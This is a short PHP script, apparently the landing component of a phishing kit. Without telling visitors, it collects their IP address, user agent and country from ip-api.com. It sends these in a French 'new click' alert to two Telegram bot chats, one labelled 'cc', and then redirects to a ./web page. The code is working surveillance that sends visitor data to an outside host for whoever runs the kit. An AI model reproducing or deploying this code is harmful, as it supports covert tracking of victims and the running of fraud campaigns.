<?php
// Include the config file
require_once './web/config.php';

// Get IP and device information
$ip = $_SERVER['REMOTE_ADDR'];
$userAgent = $_SERVER['HTTP_USER_AGENT'];

// Use IP-API to get country information
$ipInfo = json_decode(file_get_contents("http://ip-api.com/json/{$ip}?fields=country"), true);
$country = $ipInfo['country'] ?? 'Unknown';

// Prepare the message
$message = "🚨 Nouveau clic détecté 🚨\n";
$message .= "Country: " . $country . "\n";
$message .= "IP: " . $ip . "\n";
$message .= "Appareil: " . $userAgent . "\n";

// Send the message to Telegram (cc)
$telegramUrl = "https://api.telegram.org/bot{$api}/sendMessage";
$postData = [
    'chat_id' => $chatid, // Use the chat ID from config.php
    'text' => $message,
];

$options = [
    'http' => [
        'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
        'method'  => 'POST',
        'content' => http_build_query($postData),
    ],
];

$context  = stream_context_create($options);
$result = file_get_contents($telegramUrl, false, $context);

// Optionally, send the same message to another chat (vues)
$postData['chat_id'] = $chatids; // Use the second chat ID from config.php
$context  = stream_context_create($options);
$result = file_get_contents($telegramUrl, false, $context);

// Redirect to another page
header("Location: ./web");
exit; // Always call exit after a header redirect to stop further execution
?>